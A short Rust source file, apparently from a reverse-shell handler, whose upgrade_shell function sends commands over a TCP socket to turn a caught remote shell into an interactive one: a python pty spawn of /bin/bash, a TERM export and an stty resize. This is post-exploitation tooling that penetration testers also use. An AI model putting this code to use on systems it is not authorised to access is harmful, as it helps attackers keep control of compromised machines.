use tokio::net::tcp::{OwnedWriteHalf, OwnedReadHalf};
use tokio::io::AsyncWriteExt;
use terminal_size::{Width, Height, terminal_size};

pub async fn upgrade_shell(_reader: &mut OwnedReadHalf, writer: &mut OwnedWriteHalf) {
    // launch /bin/bash with python
    match writer.write_all(b"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n").await {
        Ok(_)  => {},
        Err(_) => eprintln!("Failed to initialize reverse shell."),
    }

    // set TERM env variable
    match writer.write_all(b"export TERM=xterm-256color\n").await {
        Ok(_)  => println!("Set XTERM variable"),
        Err(_) => eprintln!("Failed to set XTERM variable."),
    }

    // Set Terminal size with `stty`
    let size = terminal_size();
    if let Some((Width(w), Height(h))) = size {
        println!("Terminal size: with={} , height={}", w, h);

        // set the remote terminal size with stty
        let stty_command = format!("stty rows {} cols {}\n", h, w);

        match writer.write_all(stty_command.as_bytes()).await {
            Ok(_)  => println!("Define terminal size with stty"),
            Err(_) => eprintln!("Failed to write stty command to socket."),
        }
    } else {
        eprintln!("Failed to obtain terminal size");
    }   
}